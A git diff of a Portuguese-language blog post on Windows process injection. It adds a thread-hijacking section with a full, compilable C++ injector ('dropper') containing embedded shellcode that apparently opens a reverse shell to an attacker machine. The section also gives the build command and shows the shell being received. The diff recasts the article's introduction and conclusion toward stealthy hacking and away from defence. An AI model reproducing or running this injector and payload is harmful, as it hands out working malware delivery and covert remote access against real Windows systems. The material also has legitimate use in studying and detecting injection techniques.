@@ -12,7 +12,7 @@ alt: "Process Injection 101"
 
 # TL;DR
 
-Este artigo aborda a técnica de injeção de processos, usada para executar código arbitrário em outro processo, destacando dois métodos principais: *DLL Injection* e *Code Injection*. São apresentadas as funções do Windows que viabilizam essas técnicas, como `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` e `OpenProcess`, e exemplos práticos de injeção de código são fornecidos. A compreensão dessas técnicas é vital para profissionais de segurança cibernética, permitindo tanto o ataque quanto a defesa contra explorações maliciosas através da implementação de medidas preventivas.
+Neste artigo, exploramos a técnica de _Process Injection_, uma abordagem usada por hackers para injetar código malicioso em processos legítimos que já estão em execução. O _Process Injection_ permite a execução de código de maneira furtiva, aproveitando os privilégios e recursos dos processos injetados, o que pode facilitar o acesso a informações sensíveis e a elevação de privilégios. Diversas técnicas são utilizadas para realizar essa injeção, e o artigo fornece uma introdução às mais básicas, com exemplos práticos e referências a conceitos essenciais discutidos em artigos anteriores. Este conteúdo é voltado para aqueles que desejam entender e explorar o funcionamento interno dessas técnicas como parte de seu estudo avançado em hacking.
 
 # Introdução
 
@@ -544,6 +544,212 @@ Se analisarmos com o *Process Hacker 2* pela aba "*Memory*", podemos ver na áre
 
 ![](/img/posts/Pasted%20image%2020240807220003.png)
 
+## *Thread Hijacking*
+
+Nos exemplos anteriores testamos injeção tanto de código quanto de DLL, ambos os processos quase iguais, a diferenciar pouca coisa, porém, uma característica em comum entre ambas as técnicas é a criação de uma nova *thread* que executa o *payload*. Utilizamos nos exemplos a função `CreateRemoteThread` para este fim.
+
+Independente do método de ofuscação utilizado, o uso desta função se torna "manjado" por vários antivírus, o que a torna um alvo em potencial no processo de detecção.
+
+Porém, existem inúmeras técnicas de *process injection* que não utilizam a função `CreateRemoteThread`, uma delas é o *thread hijacking*.
+
+*Thread hijacking* nada mais é do que forçar uma *thread* original do nosso processo alvo a executar nosso *payload*. Desta forma nenhuma nova *thread* precisa ser criada.
+
+No artigo anterior, [Enumerando Processos pelo Nome](https://h41stur.com/posts/get-process/) tivemos uma visão global sobre a [*Tool Help Library*](https://learn.microsoft.com/en-us/windows/win32/toolhelp/tool-help-library) que nos permite enumerar todos os processos, *threades*, módulos e memória dos processos em execução.
+
+Inclusive, nos exemplos deste artigo, utilizamos a *Tool Help Library* para criar um *snapshot* dos processos e encontrarmos o processo alvo pelo nome.
+
+Seguindo o mesmo princípio, também podemos extrair um *snapshot* de todas as *threads* em execução e encontrar, por exemplo, a primeira *thread* criada pelo nosso processo alvo, fazemos isso comparando o PID do processo com o parâmetro `th32OwnerProcessID` contido na estrutura [THREADENTRY32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32). Quando encontrarmos esta *thread*, podemos criar um *handle* que aponta para ela com a função [OpenThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) utilizando seu ID.
+
+```cpp
+THREADENTRY32 te;
+CONTEXT cont;
+HANDLE ht;
+
+thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+if (Thread32First(thSnapshot, &te)) {
+	do {
+		if (pid == te.th32OwnerProcessID) {
+			ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+			break;
+		}
+	} while(Thread32Next(thSnapshot, &te))
+}
+```
+
+Com o *handle* desta *thread*, podemos usar a função [SuspendThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread) para suspendê-la.
+
+```cpp
+SuspendThread(ht);
+```
+
+Agora o processo fica interessante, pois com a *thread* suspensa, podemos manipulá-la. Primeiramente, precisamos captar o contexto desta *thread* com a função [GetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext), esta função salva o contexto da *thread* em uma estrutura [CONTEXT](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context), esta estrutura armazena, entre outras informações, o valor configurado para cada registrador do processador, responsável pela execução da *thread*.
+
+```cpp
+GetThreadContext(ht, &cont)
+```
+
+Uma vez que temos o estado de cada registrador, também podemos modificá-los, e é nesse ponto que modificamos o `RIP` (*instruction pointer*) da *thread* para apontar para o endereço do *buffer* para onde copiamos nosso *payload*.
+
+```cpp
+cont.Rip = (DWORD_PTR)remoteB;
+```
+
+Após a alteração do contexto, usamos a função [SetThreadContext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) para gravar o contexto adulterado. E, em seguida, resumimos a *thread* com a função [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread).
+
+```cpp
+SetThreadContext(ht, &cont);
+ResumeThread(ht);
+```
+
+Juntando tudo no código, temos:
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+
+unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+"\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80"
+"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
+"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
+"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
+"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+unsigned int payload_len = sizeof(payload);
+
+int findPID(const char *procName) {
+
+    HANDLE hSnapshot;
+    PROCESSENTRY32 pe32;
+    int pid = 0;
+    BOOL proc;
+
+    // snapshot de todos os processos em execucao
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+    // inicializando dwSize
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    // inicio da iteracao, primeiro processo
+    proc = Process32First(hSnapshot, &pe32);
+
+    // loop para iterar sobre os processos
+    while (proc) {
+        if (strcmp(procName, pe32.szExeFile) == 0) {
+            pid = pe32.th32ProcessID;
+            break;
+        }
+        proc = Process32Next(hSnapshot, &pe32);
+    }
+
+    // fecha o handle aberto
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
+int main(int argc, char* argv[]) {
+    int pid = 0;
+    HANDLE procH; // process handle
+    HANDLE remoteT; // remote thread
+    LPVOID remoteB; // remote buffer
+
+    HANDLE ht; // thread handle
+    HANDLE thSnapshot;
+    THREADENTRY32 te;
+    CONTEXT cont;
+
+    pid = findPID(argv[1]);
+
+    // configurando o contexto e o sizeof da THREADENTRY32
+    cont.ContextFlags = CONTEXT_FULL;
+    te.dwSize = sizeof(THREADENTRY32);
+
+    // cria o handle para o processo
+    procH = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+
+    // aloca o buffer de memoria no processo remoto
+    remoteB = VirtualAllocEx(procH, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+
+    // copia o payload entre os processos
+    WriteProcessMemory(procH, remoteB, payload, payload_len, NULL);
+
+    // encontrando o ID da thread para sequestrar
+    thSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+    if (Thread32First(thSnapshot, &te)) {
+        do {
+            if (pid == te.th32OwnerProcessID) {
+                ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                break;
+            }
+        } while (Thread32Next(thSnapshot, &te));
+    }
+
+    // suspendendo a thread encontrada
+    SuspendThread(ht);
+    // capturando seu contexto
+    GetThreadContext(ht, &cont);
+    // Alterando o registrador RIP
+    cont.Rip = (DWORD_PTR)remoteB;
+    // gravando a alteração
+    SetThreadContext(ht, &cont);
+    // resumindo a thread
+    ResumeThread(ht);
+
+    CloseHandle(procH);
+    return 0;
+}
+```
+
+Podemos compilar o programa:
+
+```bash
+$ x86_64-w64-mingw32-g++ -O2 dropper.cpp -o dropper.exe -mconsole -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+N máquina alvo, podemos iniciar uma instância do notepad, por exemplo, e executar nosso programa.
+
+![](/img/posts/Pasted%20image%2020240808214501.png)
+
+Na máquina atacante, recebemos o *reverse shell*.
+
+![](/img/posts/Pasted%20image%2020240808214554.png)
+
+Ao analisarmos com o *Process Hacker 2*, vemos que o notepad tem um processo filho do CMD.
+
+![](/img/posts/Pasted%20image%2020240808215236.png)
+
+Porém, uma característica única desse método, é que, mesmo que o notepad seja encerrado, a *thread* continua existindo em *background* e o *payload* ainda em execução.
+
 # Limitações
 
 Assim como todo processo em sua forma mais básica, estes métodos aqui apresentados apresentam algumas limitações.
@@ -603,16 +809,13 @@ icacls "c:\caminho\para\arquivo" /setintegritylevel Low
 
 E estas limitações que normalmente deixam brechas para ataques.
 
-
 # Conclusão
 
-A injeção de processos é uma técnica poderosa que permite a execução de código arbitrário em processos alheios. Este artigo explorou as principais metodologias de injeção de processos, como *DLL Injection*, e *Code Injection*, destacando suas aplicações e os mecanismos subjacentes.
+O _Process Injection_ é uma técnica poderosa e versátil que destaca a complexidade e sofisticação das práticas de *hacking* modernas. Ao dominar esses métodos, um hacker pode obter um controle significativo sobre sistemas-alvo, aproveitando processos legítimos para executar código de forma furtiva e eficiente.
 
-Entender o funcionamento dessas técnicas é vital para profissionais de segurança cibernética, pois proporciona *insights* valiosos sobre como proteger sistemas contra essas formas de exploração. 
+Este artigo apresentou uma visão introdutória sobre as formas mais básicas de injeção de processos, proporcionando uma base sólida para o aprofundamento em técnicas mais avançadas. Entender o funcionamento interno dessas técnicas é essencial para quem deseja explorar as possibilidades que a injeção de código oferece, seja na exploração de vulnerabilidades ou na manipulação de processos dentro de um ambiente comprometido.
 
-As seções apresentadas, incluindo exemplos práticos, fornecem uma base sólida para aqueles que buscam aprofundar seus conhecimentos sobre injeção de processos. 
-
-Em um cenário de ameaças em constante evolução, a atualização contínua do conhecimento e a adoção de melhores práticas são indispensáveis. A compreensão das técnicas de injeção de processos e a implementação de medidas preventivas permitem aos profissionais de segurança cibernética defender seus sistemas de maneira mais eficiente e resiliente.
+Ao continuarmos a expandir nosso conhecimento sobre técnicas como o _Process Injection_, é importante lembrar que o verdadeiro poder está na compreensão detalhada dos mecanismos subjacentes. Com esse entendimento, é possível explorar ao máximo as capacidades que essas técnicas oferecem, seja para pesquisa, desenvolvimento de novas abordagens ou para a prática avançada de hacking.
 
 # Referências
 
@@ -625,3 +828,10 @@ Em um cenário de ameaças em constante evolução, a atualização contínua do
 - [https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)
 - [https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry)
 - [https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists)
+- [https://h41stur.com/posts/get-process/](https://h41stur.com/posts/get-process/)
+- [https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
+- [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)
+- [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
